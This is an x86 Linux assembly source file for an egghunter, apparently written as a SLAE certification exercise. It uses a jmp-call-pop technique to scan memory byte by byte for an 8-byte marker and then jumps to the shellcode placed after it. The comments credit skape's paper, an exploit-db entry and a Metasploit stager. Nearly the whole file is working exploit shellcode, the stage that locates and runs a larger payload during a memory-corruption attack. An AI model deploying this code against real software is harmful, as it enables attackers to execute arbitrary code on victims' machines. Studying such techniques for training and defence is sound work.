; Filename: egghunt.nasm
; Author: Gitsnik SLAE-431
; Website:  http://dracyrys.com
;
; Purpose:
;	Provide an egghunter that can be used to search
;	for arbitrary sections of code.
;
; References:
;	Safely Searching Process Virtual Address Space,
;	http://www.nologin.org/
;	skape, mmiller@hick.org, 09/03/2004
;
;	http://www.exploit-db.com/exploits/17559/
;
;	metasploit/external/source/shellcode/linux/ia32/stager_egghunt.asm
;
; Notes:
;	Not even the Metasploit team are doing anything new or
;	creative with egghunting in Linux. This is basically
;	a small rewrite of the exploit-db code with my own egg in it
;	and a bit of an explanation.
;
;	My Egg is my SLAE-431 rather than the same egg twice.
;	the code is ok because of the jne commands between the
;	cmp's breaking up the egg.
;
;	The idea is that it is not a requirement, but because
;	we control the egg hunter, we can skip out on particular
;	sections of our egg code. In the unlikely event that we
;	have a 30 byte egg, and 50 byte shellcode but only, say,
;	40 bytes to use for each of them in the code, we can
;	move some of the simpler functions (xor ebx, ebx etc.)
;	from the start of the egg to the end of the hunter.
;

global _start			

section .text
_start:
	jmp	caller
popper:
	pop	eax		; Standard jmp-call-pop
forward:
	inc	eax		; Move forward from the
				; location of EAX and through
				; memory.

	;
	; Byte by byte increments are happening through a space
	; we already know we can get to (via the jmp-call-pop).
	;
	; This means there is no need to worry about stack/page
	; alignment too much as we will always find the egg
	; regardless of alignment (because we only move forward
	; one byte at a time).
	;

check:
	cmp	dword [eax-0x8],0x45414c53	; If eax-0x8 is the
						; start of the egg
	jne	forward
	cmp	dword [eax-0x4],0x3133342d	; and if eax-0x4 is
						; the end of the egg
	jne	forward
	jmp	eax				; then jump straight
						; to EAX which is
						; the entirety of our
						; egg.

caller:
	call popper

section .data
